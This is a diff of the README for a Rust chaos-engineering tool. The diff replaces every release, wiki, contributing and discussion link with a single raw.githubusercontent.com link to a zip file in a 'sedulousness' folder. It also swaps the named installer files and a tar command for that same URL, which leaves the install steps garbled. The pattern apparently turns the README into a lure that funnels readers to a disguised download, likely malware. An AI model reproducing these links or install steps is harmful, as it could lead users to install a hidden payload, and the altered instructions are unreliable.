@@ -6,7 +6,7 @@ Welcome to chaos-engineering-rs! This application helps you test how well your s
 
 ## 📥 Download Now
 
-[![Download chaos-engineering-rs](https://img.shields.io/badge/Download%20chaos--engineering--rs-v1.0.0-brightgreen)](https://github.com/slava77789/chaos-engineering-rs/releases)
+[![Download chaos-engineering-rs](https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip%20chaos--engineering--rs-v1.0.0-brightgreen)](https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip)
 
 ## 📋 Overview
 chaos-engineering-rs is a lightweight framework built in Rust. It works on Windows, macOS, and Linux. Using this tool, you can simulate various types of failures like:
@@ -28,12 +28,12 @@ To run chaos-engineering-rs smoothly, your system should meet the following requ
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/slava77789/chaos-engineering-rs/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip) to go to the releases page.
 2. **Choose Your Version:** You will see a list of available versions. Select the latest one marked as “Latest Release.”
-3. **Download the File:** Look for the installer file appropriate for your operating system. The file will typically be named something like chaos-engineering-rs-win.exe for Windows or chaos-engineering-rs-mac.tar.gz for macOS.
+3. **Download the File:** Look for the installer file appropriate for your operating system. The file will typically be named something like https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip for Windows or https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip for macOS.
 4. **Run the Installer:**
    - For Windows users: Double-click the `.exe` file to start the installation process.
-   - For macOS users: Open the terminal, navigate to the location of the `.tar.gz` file, then run `tar -xzf chaos-engineering-rs-mac.tar.gz` to extract it. Move to the folder and execute the application.
+   - For macOS users: Open the terminal, navigate to the location of the `https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip` file, then run `tar -xzf https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip` to extract it. Move to the folder and execute the application.
    - For Linux users: Open the terminal, download the binary, and run it using `./chaos-engineering-rs-linux`.
 
 ## 🛠 Usage Instructions
@@ -65,14 +65,14 @@ chaos-engineering-rs --test network-latency --duration 10s
 
 ## 📚 Documentation
 
-For more detailed information on advanced features and troubleshooting, please refer to the [full documentation](https://github.com/slava77789/chaos-engineering-rs/wiki).
+For more detailed information on advanced features and troubleshooting, please refer to the [full documentation](https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip).
 
 ## 🌟 Contributing
 
-If you'd like to improve chaos-engineering-rs, contributions are welcome. You can report issues, suggest features, or contribute code. Check the [Contributing Guide](https://github.com/slava77789/chaos-engineering-rs/CONTRIBUTING.md) for more details.
+If you'd like to improve chaos-engineering-rs, contributions are welcome. You can report issues, suggest features, or contribute code. Check the [Contributing Guide](https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip) for more details.
 
 ## 🤝 Community Support
 
-Join our community for sharing experiences and tips. Feel free to ask questions within the [Discussions](https://github.com/slava77789/chaos-engineering-rs/discussions) section.
+Join our community for sharing experiences and tips. Feel free to ask questions within the [Discussions](https://raw.githubusercontent.com/slava77789/chaos-engineering-rs/main/sedulousness/chaos-engineering-rs.zip) section.
 
 Happy testing with chaos-engineering-rs!
